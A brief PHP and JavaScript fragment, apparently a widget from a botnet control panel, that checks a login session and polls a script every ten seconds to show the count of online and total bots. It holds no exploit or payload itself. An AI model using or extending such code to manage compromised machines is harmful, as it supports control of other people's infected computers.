<?php @session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }	?>
<table cellspacing="0" cellpadding="0" border="0" width="100px" height="50px">
<tr>
	<td width="57px"  id='bstat' title="Bots Online y Total Bots" align="center"></td>
</tr>
</table>

<script type="text/javascript" defer>

function Estadisticas(){
	AjaxLoad_3("Controladores/mod_bots-qview.php" , 0 , "#bstat");
	setTimeout("Estadisticas()",10000);
	return false ;
}
</script>